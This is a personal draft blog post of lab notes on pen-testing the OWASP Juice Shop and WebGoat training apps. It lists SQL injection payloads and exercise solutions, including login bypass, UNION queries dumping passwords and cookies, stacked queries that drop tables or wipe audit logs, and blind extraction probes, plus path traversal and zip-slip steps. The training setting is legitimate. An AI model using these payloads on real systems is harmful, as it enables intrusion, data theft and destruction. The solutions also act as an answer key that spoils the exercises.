---
title: OWASP Juice Shop & WebGoat
slug: web-site-pen-testing
date_published: 1970-01-01T00:00:00.000Z
date_updated: 2023-05-28T08:22:11.000Z
draft: true
---

Some notes and such from my adventures so far...

For those who don't know, the [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) is a handy app that allows you to test your web app pen testing skills.

I set up a local VM and installed the Juice Shop manually using NodeJS and NPM.

After getting the Juice Shop server set up, I set up an additional VM with Kali Linux and then provided them both with only a single network interface, a local link, to talk to each other.

On the Kali box, I tried the following apps to get an general idea of possible exploits.

### Scanning the Juice Store

- Wapiti: Found nothing
- SkipFish: Decent amount of hidden directories and more. Nice HTML report. Crashed web server. Found redirect flag for Juice Store.
- BurpSuite: Have to request a trial for 30 days (don't want to pay $500 for pro in order to scan). Still waiting on trial.
- nikto: Very heavy on the certificates found in various paths. Bad reporting? Need to check if output a nicer report format. Found WordPress directories that others missed.

### SQL Injection

I find most information on the internet about SQL Injection sorely lacking. I think most people just copy and paste the same old tired example of

`' or 1=1;--`

Which I can't possibly see working on 99% of all servers in production, but what do I know. I say this as this is the same example that has been floating around for a long time.

Anyways, on to the Juice Shop login page. Here I was able to log on as administrator with:

User:

    administrator\' or 1=1;--

Pass: test

Which logged me in and provided me with the real admin email: admin@juice-sh.op

### OWASP WebGoat

Download and installation instructions are [here](https://owasp.org/www-project-webgoat/).

I also set up WebGoat on the same VM as the Juice Shop. A useful tip for anyone doing the same thing was that the documentation on the website was incorrect or misleading as I wanted to change the default IP from localhost to 0.0.0.0. On the website it seems to imply that you can add the '--server.address' argument as:

`java -jar webgoat-app.jar --server.address=0.0.0.0`

And this certainly did not work for me. I have a set up where I have 2 VMs on a local link where the WebGoat would be at 169.254.7.200 and my attacking machine (using Kali) would be at 169.254.7.150.

This is what finally worked for me (which I gleaned from the [github repo](https://github.com/WebGoat/WebGoat)):

`java -Dserver.address=0.0.0.0 -jar webgoat-app.jar`

Another tip when going through the SQL Injection, especially as I skipped directly to these lessons, the DB being used is the HSQLDB and therefore the admin SQL reference can be found [here](https://hsqldb.org/doc/2.0/guide/guide.html).

Some good tips picked up from the lessons in WebGoat:

- ' or 1=1; TRUNCATE audit_log;--
- ' or '1'='1
- SQL Injection more common in PHP, ASP and ColdFusion
- SQL server provides command shell
- String concatenation with ' or + or ||
- Strings without quotes: char(27)
- SELECT * FROM users WHERE name = '+char(27) OR 1=1
- use prepared statements help mitigate SQL Injection
- implement whitelist with ORDER BY
- Use zip files to overwrite files after upload using path traversal

### Blind SQL Injection

- Involves asking 'database true or false questions' when server provides only generic error responses.
- Types include: content-based and time-based injections
- Find out what type of DB as that can provide insight to system tables

### Blind SQL Injection - Example of content-based:

- https://shop.example.com/?article=4 and 1=1 --> if no error, then DB might be susceptible to SQL injection

### Blind SQL Injection - Example of time-based:

- article = 4; sleep(10) --

### WebGoat SQL (Intro) - Solution for exercise 9:

`' or '1'='1`

### WebGoat SQL (Intro) - Solution for exercise 10:

Login_Count: `1`

User_Id: `1 or 1=1`

### WebGoat SQL (Intro) - Solution for exercise 11:

Employee Name: `' or 1=1;--`

or

Employee Name: Blah

Authentication TAN: `' or '1'='1`

### WebGoat SQL (Intro) - Solution for exercise 12:

Employee Name: `' or 1=1; UPDATE employees SET salary=100000 WHERE first_name='John'`

### WebGoat SQL (Intro) - Solution for exercise 13:

Action contains: `' or 1=1; DROP TABLE access_log;--`

### WebGoat SQL (Advanced) - Solution for exercise 3:

Name: `Dave' union select userid, user_name, 'name', 'cc', password, cookie, 1 from user_system_data;--`

or

Name: `Dave'; select * from user_system_data;--`

### WebGoat SQL (Advanced) - Solution for exercise 5:

This one involved blind SQL injection on a login page. After much trials on the login section with the username and pass, I moved on to the registration section and created a new user named 'devon.' After creating the user I then tried creating the same user with:

`devon' and 1=1;--`

The response was that the user was already created, but this can't be true as the username includes the '1=1' and other special script. This shows that there is a user with this name, which we already knew and that the server used the remaining string as an injection that compared the user name AND 1=1 which returned a hit.

Also, you can create another user account with:

`devon' and 1=2;--`

And then create ANOTHER account with the exact same string. And then create ANOTHER account with the same exact string and so on. This again indicates that the server is using the injection as the 1=2 ensures that even though there IS a 'devon' that the select returns a false as 1=2 --> FALSE and therefore TRUE AND FALSE = FALSE.

### WebGoat  SQL (Mitigation) - Solution for exercise 9:

`'/*sp*/or/*sp*/'1'='1';select/*sp*/*/*sp*/from/*sp*/user_system_data;--`

### WebGoat  SQL (Path Traversal) - Solution for exercise 3:

Full Name: `....//test`

### WebGoat  SQL (Path Traversal) - Solution for exercise 4:

Open Manua Request Editor using OWASP ZAP. In the request body change:
`filename="../white-bookshelf.jpg"`

### WebGoat  SQL (Path Traversal) - Solution for exercise 5:

Open OWASP ZAP and find the GET request that is being sent when the 'Show random cat picture' button is pressed. Modify this request and resend it using the Manual Request Editor. Found the location by first adding just `%2e%2e%2f` to the GET request and getting 404 error message with current directory. There is a URL encoding tool in ZAP.

`GET http://localhost:9000/WebGoat/PathTraversal/random-picture?id=%2e%2e%2f%2e%2e%2fpath-traversal-secret`

### WebGoat  SQL (Path Traversal) - Solution for exercise 7:

In terminal, change directory to `/tmp/webgoat125something`. Place .jpg file in `/home/user/.webgoat/PathTraversal/webgoat/webgoat.jpg`. While still in the webgoat tmp folder, zip the webgoat.jpg by adding it's path to zip command:

`zip goat.zip ../../home/user/.webgoat/PathTraversal/webgoat/webgoat.jpg`

### Some things to try:

- using EXISTS: `' or EXISTS(SELECT * FROM users);`
- `devon' and exists(select * from users) and '1'='1`
- `devon' any(select * from users) and '1'='1`
- `Tom' and length(password)>0;`--
- tom' AND ascii(substring(password,1,1)) > 60;--
- Tom' and length(user)>5;--
- Tom' and ascii(substr(user,2,2))=65;--
- Tom' and right(email,3)='com
